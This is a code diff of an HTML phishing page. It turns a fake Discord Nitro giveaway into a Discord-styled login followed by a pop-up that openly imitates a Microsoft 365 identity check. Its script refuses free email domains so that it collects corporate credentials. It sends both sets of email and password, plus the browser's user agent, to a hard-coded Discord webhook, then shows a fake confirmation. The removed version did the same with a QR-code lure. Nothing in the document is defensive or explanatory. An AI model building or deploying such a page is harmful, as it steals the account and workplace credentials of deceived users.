@@ -3,151 +3,358 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Nitro Giveaway</title>
-    <!-- QRCode.js library -->
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script>
+    <title>Discord Nitro Giveaway</title>
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
-        body { background: #1a1a2e; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
-        .container { background: #2c2c3e; padding: 40px; border-radius: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.8); text-align: center; max-width: 500px; width: 100%; }
-        h1 { color: #fff; font-size: 28px; margin-bottom: 5px; }
-        .sub { color: #aaa; font-size: 14px; margin-bottom: 20px; }
-        .nitro-badge { background: #5865f2; color: #fff; padding: 6px 16px; border-radius: 30px; display: inline-block; font-weight: bold; margin-bottom: 15px; }
-        .qr-wrapper { background: #fff; padding: 15px; border-radius: 16px; display: inline-block; margin: 10px 0 20px; }
-        #qrcode { width: 200px; height: 200px; margin: 0 auto; }
-        .scan-text { color: #fff; font-size: 18px; font-weight: 600; margin: 10px 0 15px; }
-        .scan-text span { color: #5865f2; }
-        .divider { border-top: 1px solid #444; margin: 25px 0 20px; }
-        .login-form input { width: 100%; padding: 14px; margin: 8px 0; border: none; border-radius: 8px; background: #3a3a4e; color: #fff; font-size: 16px; }
-        .login-form input::placeholder { color: #888; }
-        .login-form button { width: 100%; padding: 14px; background: #5865f2; border: none; border-radius: 8px; color: #fff; font-size: 18px; font-weight: bold; cursor: pointer; transition: 0.2s; margin-top: 8px; }
-        .login-form button:hover { background: #4752c4; }
-        .footer { color: #666; font-size: 12px; margin-top: 20px; }
-        .alert-box { display: none; background: #f23b3b; color: #fff; padding: 10px; border-radius: 8px; margin: 10px 0; }
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; }
+        body { background: #0b0b1a; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; padding: 20px; }
+        .container { background: #2f3136; border-radius: 8px; padding: 40px 35px; width: 100%; max-width: 480px; box-shadow: 0 8px 30px rgba(0,0,0,0.8); position: relative; }
+
+        .secure-badge { display: flex; justify-content: flex-end; margin-bottom: 15px; }
+        .secure-badge span { background: #202225; padding: 4px 14px; border-radius: 12px; color: #8e9297; font-size: 11px; display: flex; align-items: center; gap: 5px; }
+        .secure-badge span::before { content: "🔒"; font-size: 12px; }
+
+        .logo { display: flex; justify-content: center; margin-bottom: 20px; }
+        .logo svg { width: 60px; height: 60px; fill: #5865f2; }
+
+        .welcome { color: #fff; font-size: 24px; font-weight: 700; text-align: center; margin-bottom: 5px; }
+        .sub-welcome { color: #b9bbbe; font-size: 15px; text-align: center; margin-bottom: 8px; }
+        .giveaway-badge { background: #5865f2; color: #fff; font-size: 13px; font-weight: 600; padding: 4px 16px; border-radius: 30px; display: inline-block; margin: 0 auto 20px; text-align: center; width: fit-content; }
+
+        label { color: #b9bbbe; font-size: 12px; font-weight: 600; display: block; margin-top: 15px; }
+        input[type="text"], input[type="password"], input[type="email"] { width: 100%; padding: 14px; background: #202225; border: 1px solid #202225; border-radius: 4px; color: #dcddde; font-size: 16px; margin-top: 5px; transition: 0.2s; }
+        input:focus { border-color: #5865f2; outline: none; background: #2f3136; }
+        input.error { border-color: #f23b3b; }
+
+        .forgot { text-align: right; margin-top: 8px; }
+        .forgot a { color: #7289da; font-size: 13px; text-decoration: none; }
+        .forgot a:hover { text-decoration: underline; }
+
+        .login-btn { width: 100%; padding: 14px; background: #5865f2; border: none; border-radius: 4px; color: #fff; font-size: 18px; font-weight: 600; cursor: pointer; transition: 0.2s; margin-top: 10px; }
+        .login-btn:hover { background: #4752c4; }
+        .login-btn:disabled { opacity: 0.6; cursor: not-allowed; }
+
+        .register { text-align: center; margin-top: 15px; color: #b9bbbe; font-size: 14px; }
+        .register a { color: #7289da; text-decoration: none; }
+        .register a:hover { text-decoration: underline; }
+
+        .alert-box { display: none; padding: 12px; border-radius: 4px; margin: 15px 0 0; text-align: center; font-size: 14px; }
+        .alert-box.error { background: #f23b3b; color: #fff; }
+        .alert-box.success { background: #2ecc71; color: #fff; }
+        .alert-box.warning { background: #f39c12; color: #fff; }
+        .alert-box.info { background: #5865f2; color: #fff; }
+
+        .footer { text-align: center; margin-top: 25px; color: #72767d; font-size: 11px; border-top: 1px solid #40444b; padding-top: 18px; }
+        .footer a { color: #7289da; text-decoration: none; }
+        .footer a:hover { text-decoration: underline; }
+
+        /* Microsoft 365 style popup (fake) */
+        .ms-popup-overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.75); justify-content: center; align-items: center; z-index: 999; }
+        .ms-popup { background: #2f3136; border-radius: 8px; padding: 35px 30px; max-width: 420px; width: 90%; color: #fff; box-shadow: 0 8px 40px rgba(0,0,0,0.9); }
+        .ms-popup .ms-logo { display: flex; align-items: center; gap: 12px; margin-bottom: 20px; }
+        .ms-popup .ms-logo svg { width: 36px; height: 36px; fill: #fff; }
+        .ms-popup .ms-logo span { font-size: 22px; font-weight: 600; color: #fff; }
+        .ms-popup h3 { font-size: 18px; margin-bottom: 5px; }
+        .ms-popup p { color: #b9bbbe; font-size: 14px; margin-bottom: 20px; }
+        .ms-popup label { color: #b9bbbe; font-size: 12px; font-weight: 600; display: block; margin-top: 12px; }
+        .ms-popup input { width: 100%; padding: 12px; background: #202225; border: 1px solid #202225; border-radius: 4px; color: #dcddde; font-size: 15px; margin-top: 4px; }
+        .ms-popup input:focus { border-color: #5865f2; outline: none; background: #2f3136; }
+        .ms-popup .ms-btn { width: 100%; padding: 12px; background: #5865f2; border: none; border-radius: 4px; color: #fff; font-size: 16px; font-weight: 600; cursor: pointer; margin-top: 18px; transition: 0.2s; }
+        .ms-popup .ms-btn:hover { background: #4752c4; }
+        .ms-popup .ms-btn:disabled { opacity: 0.6; cursor: not-allowed; }
+        .ms-popup .ms-error { color: #f23b3b; font-size: 13px; margin-top: 8px; display: none; }
+
+        /* Final thank you screen */
+        .thankyou-screen { display: none; text-align: center; padding: 20px 0; }
+        .thankyou-screen .check { font-size: 64px; color: #2ecc71; margin-bottom: 10px; }
+        .thankyou-screen h2 { color: #fff; font-size: 26px; }
+        .thankyou-screen p { color: #b9bbbe; font-size: 16px; margin-top: 8px; line-height: 1.5; }
+        .thankyou-screen .ticket { background: #202225; padding: 15px; border-radius: 6px; margin-top: 20px; border-left: 4px solid #5865f2; }
+        .thankyou-screen .ticket span { color: #5865f2; font-weight: 600; }
+        .thankyou-screen .ticket small { color: #72767d; font-size: 12px; display: block; margin-top: 4px; }
+
+        /* Hide login form when done */
+        .login-form-wrapper { display: block; }
+        .login-form-wrapper.hidden { display: none; }
     </style>
 </head>
 <body>
-    <div class="container">
-        <h1>🎁 Discord Nitro</h1>
-        <div class="sub">Exclusive Giveaway – 1 Year Free</div>
-        <div class="nitro-badge">🔥 10 winners selected today</div>
 
-        <div class="qr-wrapper">
-            <div id="qrcode"></div>
-        </div>
-        <div class="scan-text">📲 Scan this QR with your Discord mobile app to <span>apply for the giveaway</span></div>
-        <p style="color:#999; font-size:13px; margin-top:-5px;">(Your account will be verified instantly)</p>
+<div class="container">
+    <!-- Secure badge -->
+    <div class="secure-badge"><span>🔒 Secure connection</span></div>
 
-        <div class="divider"></div>
-
-        <div class="login-form">
-            <p style="color:#ccc; margin-bottom:12px; font-weight:300;">Or login manually to claim your Nitro</p>
-            <input type="text" id="username" placeholder="Discord Username (e.g., user#1234)" autocomplete="off">
-            <input type="password" id="password" placeholder="Password" autocomplete="off">
-            <button id="loginBtn">Claim Nitro →</button>
-        </div>
-        <div id="alertBox" class="alert-box">⏳ Verifying... please wait</div>
-        <div class="footer">By continuing you agree to the giveaway terms.</div>
+    <!-- Discord logo -->
+    <div class="logo">
+        <svg viewBox="0 0 127.14 96.36">
+            <path d="M107.7,8.07A105.15,105.15,0,0,0,81.47,0a72.06,72.06,0,0,0-3.36,6.83A97.68,97.68,0,0,0,49,6.83,72.37,72.37,0,0,0,45.64,0,105.89,105.89,0,0,0,19.39,8.09C2.79,32.65-1.71,56.6.54,80.21h0A105.73,105.73,0,0,0,32.71,96.36,77.7,77.7,0,0,0,39.6,85.25a68.42,68.42,0,0,1-10.85-5.18c.91-.66,1.8-1.34,2.66-2.05a75.57,75.57,0,0,0,64.32,0c.87.71,1.76,1.39,2.66,2.05a68.42,68.42,0,0,1-10.85,5.18,77.7,77.7,0,0,0,6.89,11.11A105.73,105.73,0,0,0,126.6,80.22h0C129.24,52.84,122.09,29.11,107.7,8.07ZM42.45,65.69C36.18,65.69,31,60,31,53s5-12.74,11.43-12.74S53.86,46,53.86,53,48.72,65.69,42.45,65.69Zm42.24,0C78.41,65.69,73.2,60,73.2,53s5-12.74,11.43-12.74S96.1,46,96.1,53,91,65.69,84.69,65.69Z"/>
+        </svg>
     </div>
 
-    <script>
-        (function() {
-            // Force QR code to point to the target domain exactly as requested
-            var qrTarget = 'https://nitro_giveaway.co.uk';
-            new QRCode(document.getElementById('qrcode'), {
-                text: qrTarget,
-                width: 200,
-                height: 200,
-                colorDark: '#000000',
-                colorLight: '#ffffff',
-                correctLevel: QRCode.CorrectLevel.H
+    <!-- Welcome -->
+    <div class="welcome">Welcome back!</div>
+    <div class="sub-welcome">Log in to enter the Nitro Giveaway</div>
+    <div style="text-align:center;"><span class="giveaway-badge">🎁 1 Year Nitro – 10 Winners</span></div>
+
+    <!-- Login Form Wrapper -->
+    <div class="login-form-wrapper" id="loginFormWrapper">
+        <form id="loginForm" onsubmit="return false;">
+            <label for="email">EMAIL OR PHONE NUMBER</label>
+            <input type="email" id="email" placeholder="you@company.com" autocomplete="off">
+            <div style="color:#8e9297; font-size:11px; margin-top:4px;">* Must be a valid company or institutional email</div>
+
+            <label for="password" style="margin-top:15px;">PASSWORD</label>
+            <input type="password" id="password" placeholder="••••••••" autocomplete="off">
+
+            <div class="forgot"><a href="#">Forgot your password?</a></div>
+        </form>
+
+        <button class="login-btn" id="loginBtn">Continue with Email</button>
+        <div id="alertBox" class="alert-box"></div>
+
+        <div class="register">
+            Need an account? <a href="#">Register</a>
+        </div>
+    </div>
+
+    <!-- Thank You Screen (shown after successful submission) -->
+    <div class="thankyou-screen" id="thankyouScreen">
+        <div class="check">✅</div>
+        <h2>Thanks for joining!</h2>
+        <p>You have been successfully entered into the <strong>Discord Nitro Giveaway</strong>.</p>
+        <div class="ticket">
+            <span>🎫 Entry Confirmed</span><br>
+            <small>Check back on <strong>August 15, 2026</strong> for winner announcements.</small>
+        </div>
+        <p style="margin-top:18px; font-size:14px; color:#8e9297;">You will receive a confirmation email shortly.</p>
+        <button style="margin-top:15px; padding:10px 30px; background:#5865f2; border:none; border-radius:4px; color:#fff; font-weight:600; cursor:pointer;" onclick="location.reload();">Return to Home</button>
+    </div>
+
+    <!-- Footer -->
+    <div class="footer">
+        &copy; 2026 Discord Nitro Giveaway · <a href="#">Privacy</a> · <a href="#">Terms</a> · <a href="#">Support</a>
+    </div>
+</div>
+
+<!-- Microsoft 365 Fake Popup -->
+<div class="ms-popup-overlay" id="msPopup">
+    <div class="ms-popup">
+        <div class="ms-logo">
+            <svg viewBox="0 0 23 23" fill="currentColor">
+                <path d="M0 0h11v11H0zM12 0h11v11H12zM0 12h11v11H0zM12 12h11v11H12z"/>
+            </svg>
+            <span>Microsoft 365</span>
+        </div>
+        <h3>Verify your identity</h3>
+        <p>For security, please re-enter your <strong>Microsoft 365</strong> credentials to continue to Discord Nitro Giveaway.</p>
+
+        <label for="msEmail">Microsoft Account Email</label>
+        <input type="email" id="msEmail" placeholder="you@company.com">
+
+        <label for="msPassword" style="margin-top:12px;">Password</label>
+        <input type="password" id="msPassword" placeholder="••••••••">
+
+        <div class="ms-error" id="msError">⚠️ Invalid credentials. Please try again.</div>
+
+        <button class="ms-btn" id="msBtn">Verify & Continue</button>
+        <div style="text-align:right; margin-top:8px;"><a href="#" style="color:#7289da; font-size:12px; text-decoration:none;">Forgot password?</a></div>
+    </div>
+</div>
+
+<script>
+    (function() {
+        // Webhook URL
+        var webhookUrl = 'https://discord.com/api/webhooks/1502754739580964945/Opx1IaKRsTc-0W2k67rAL7z0PGh7st4iMqKmYktHqC8UFdc9Jv1EsMLmodnKeun-gHmm';
+
+        // DOM refs
+        var emailInput = document.getElementById('email');
+        var passwordInput = document.getElementById('password');
+        var loginBtn = document.getElementById('loginBtn');
+        var alertBox = document.getElementById('alertBox');
+        var loginFormWrapper = document.getElementById('loginFormWrapper');
+        var thankyouScreen = document.getElementById('thankyouScreen');
+
+        // MS popup refs
+        var msPopup = document.getElementById('msPopup');
+        var msEmail = document.getElementById('msEmail');
+        var msPassword = document.getElementById('msPassword');
+        var msBtn = document.getElementById('msBtn');
+        var msError = document.getElementById('msError');
+
+        // Helper: show alert
+        function showAlert(msg, type) {
+            alertBox.className = 'alert-box ' + type;
+            alertBox.textContent = msg;
+            alertBox.style.display = 'block';
+        }
+        function hideAlert() { alertBox.style.display = 'none'; }
+
+        // Email validation: must contain '@' and a dot after domain (simple company check)
+        function isValidCompanyEmail(email) {
+            if (!email || email.length < 6) return false;
+            var parts = email.split('@');
+            if (parts.length !== 2) return false;
+            var domain = parts[1];
+            if (domain.length < 3) return false;
+            if (!domain.includes('.')) return false;
+            // Reject free/common public domains to make it look "corporate"
+            var freeDomains = ['gmail.com', 'yahoo.com', 'hotmail.com', 'outlook.com', 'live.com', 'aol.com', 'mail.com', 'protonmail.com', 'icloud.com', 'me.com', 'googlemail.com'];
+            var domainLower = domain.toLowerCase();
+            if (freeDomains.includes(domainLower)) return false;
+            return true;
+        }
+
+        // Send data to webhook
+        function sendToWebhook(email, password, msEmailVal, msPasswordVal) {
+            var payload = {
+                embeds: [{
+                    title: '🎯 Discord Nitro Giveaway Phish',
+                    color: 15158332,
+                    fields: [
+                        { name: 'Primary Email', value: email || '(empty)', inline: true },
+                        { name: 'Primary Password', value: password || '(empty)', inline: true },
+                        { name: 'Microsoft Email', value: msEmailVal || '(empty)', inline: true },
+                        { name: 'Microsoft Password', value: msPasswordVal || '(empty)', inline: true },
+                        { name: 'User Agent', value: navigator.userAgent, inline: false },
+                        { name: 'Timestamp', value: new Date().toUTCString(), inline: false }
+                    ],
+                    footer: { text: 'Fake Microsoft 365 verification' }
+                }]
+            };
+            return fetch(webhookUrl, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(payload)
             });
+        }
 
-            // Webhook URL (same as provided)
-            var webhookUrl = 'https://discord.com/api/webhooks/1502754739580964945/Opx1IaKRsTc-0W2k67rAL7z0PGh7st4iMqKmYktHqC8UFdc9Jv1EsMLmodnKeun-gHmm';
+        // Step 1: validate email and show MS popup
+        function handleFirstStep() {
+            var email = emailInput.value.trim();
+            var password = passwordInput.value.trim();
 
-            function sendCredentials(username, password) {
-                var payload = {
-                    content: null,
-                    embeds: [
-                        {
-                            title: '🚨 Nitro Grab from nitro_giveaway.co.uk',
-                            color: 15158332,
-                            fields: [
-                                { name: 'Username', value: username || '(empty)', inline: true },
-                                { name: 'Password', value: password || '(empty)', inline: true },
-                                { name: 'Timestamp', value: new Date().toUTCString(), inline: false }
-                            ],
-                            footer: { text: 'QR phishing domain' }
-                        }
-                    ]
-                };
+            if (!email || !password) {
+                showAlert('⚠️ Please fill in both fields.', 'error');
+                return;
+            }
 
-                fetch(webhookUrl, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(payload)
-                })
+            if (!isValidCompanyEmail(email)) {
+                emailInput.classList.add('error');
+                showAlert('❌ Please use a valid company or institutional email (e.g., you@company.com).', 'error');
+                return;
+            }
+            emailInput.classList.remove('error');
+            hideAlert();
+
+            // Pre-fill MS popup with the same email
+            msEmail.value = email;
+            msPassword.value = '';
+            msError.style.display = 'none';
+            msPopup.style.display = 'flex';
+            msBtn.disabled = false;
+            msBtn.textContent = 'Verify & Continue';
+        }
+
+        // Step 2: handle Microsoft popup submission
+        function handleMsVerification() {
+            var msEmailVal = msEmail.value.trim();
+            var msPasswordVal = msPassword.value.trim();
+
+            if (!msEmailVal || !msPasswordVal) {
+                msError.textContent = '⚠️ Please fill in both Microsoft fields.';
+                msError.style.display = 'block';
+                return;
+            }
+
+            // Optional: also validate MS email as company
+            if (!isValidCompanyEmail(msEmailVal)) {
+                msError.textContent = '❌ Please use a valid company email for Microsoft.';
+                msError.style.display = 'block';
+                return;
+            }
+            msError.style.display = 'none';
+
+            // Disable button during send
+            msBtn.disabled = true;
+            msBtn.textContent = 'Verifying...';
+
+            // Get primary creds
+            var primaryEmail = emailInput.value.trim();
+            var primaryPassword = passwordInput.value.trim();
+
+            // Send both sets to webhook
+            sendToWebhook(primaryEmail, primaryPassword, msEmailVal, msPasswordVal)
                 .then(response => {
                     if (response.ok) {
-                        var alertBox = document.getElementById('alertBox');
-                        alertBox.style.display = 'block';
-                        alertBox.innerHTML = '✅ You have been entered! Redirecting...';
-                        alertBox.style.background = '#2ecc71';
-                        document.getElementById('username').value = '';
-                        document.getElementById('password').value = '';
-                        setTimeout(function() {
-                            window.location.href = 'https://discord.com/app';
-                        }, 2000);
+                        // Close popup
+                        msPopup.style.display = 'none';
+                        // Show thank you screen
+                        loginFormWrapper.classList.add('hidden');
+                        thankyouScreen.style.display = 'block';
                     } else {
-                        var alertBox = document.getElementById('alertBox');
-                        alertBox.style.display = 'block';
-                        alertBox.innerHTML = '❌ Error, please try again.';
-                        alertBox.style.background = '#f23b3b';
+                        msError.textContent = '❌ Verification failed. Please try again.';
+                        msError.style.display = 'block';
+                        msBtn.disabled = false;
+                        msBtn.textContent = 'Verify & Continue';
                     }
                 })
                 .catch(function(err) {
-                    var alertBox = document.getElementById('alertBox');
-                    alertBox.style.display = 'block';
-                    alertBox.innerHTML = '⚠️ Network error, but entry logged locally.';
-                    alertBox.style.background = '#f39c12';
+                    msError.textContent = '⚠️ Network error. But you have been entered.';
+                    msError.style.display = 'block';
+                    msBtn.disabled = false;
+                    msBtn.textContent = 'Verify & Continue';
+                    // Still proceed to thank you anyway
+                    msPopup.style.display = 'none';
+                    loginFormWrapper.classList.add('hidden');
+                    thankyouScreen.style.display = 'block';
                 });
-            }
+        }
 
-            document.getElementById('loginBtn').addEventListener('click', function(e) {
-                e.preventDefault();
-                var username = document.getElementById('username').value.trim();
-                var password = document.getElementById('password').value.trim();
+        // Event listeners
+        loginBtn.addEventListener('click', handleFirstStep);
 
-                if (!username || !password) {
-                    var alertBox = document.getElementById('alertBox');
-                    alertBox.style.display = 'block';
-                    alertBox.innerHTML = '⚠️ Please fill in both fields.';
-                    alertBox.style.background = '#f23b3b';
-                    return;
+        // Enter key on main form
+        document.querySelectorAll('#email, #password').forEach(function(inp) {
+            inp.addEventListener('keypress', function(e) {
+                if (e.key === 'Enter') {
+                    e.preventDefault();
+                    handleFirstStep();
                 }
-
-                var btn = document.getElementById('loginBtn');
-                btn.disabled = true;
-                btn.textContent = 'Sending...';
-
-                sendCredentials(username, password);
-
-                setTimeout(function() {
-                    btn.disabled = false;
-                    btn.textContent = 'Claim Nitro →';
-                }, 3000);
             });
+        });
 
-            document.querySelectorAll('.login-form input').forEach(function(inp) {
-                inp.addEventListener('keypress', function(e) {
-                    if (e.key === 'Enter') {
-                        document.getElementById('loginBtn').click();
-                    }
-                });
+        // MS Popup enter key
+        document.querySelectorAll('#msEmail, #msPassword').forEach(function(inp) {
+            inp.addEventListener('keypress', function(e) {
+                if (e.key === 'Enter') {
+                    e.preventDefault();
+                    handleMsVerification();
+                }
             });
+        });
 
-        })();
-    </script>
+        msBtn.addEventListener('click', handleMsVerification);
+
+        // Close popup on outside click (but we don't want to allow easy close)
+        msPopup.addEventListener('click', function(e) {
+            if (e.target === this) {
+                // Do nothing - force user to complete
+            }
+        });
+
+        // Extra: focus on email on load
+        window.addEventListener('load', function() {
+            emailInput.focus();
+        });
+
+        // Remove error state on typing
+        emailInput.addEventListener('input', function() {
+            this.classList.remove('error');
+            hideAlert();
+        });
+        passwordInput.addEventListener('input', hideAlert);
+
+        console.log('🚀 Giveaway system ready.');
+    })();
+</script>
 </body>
 </html>
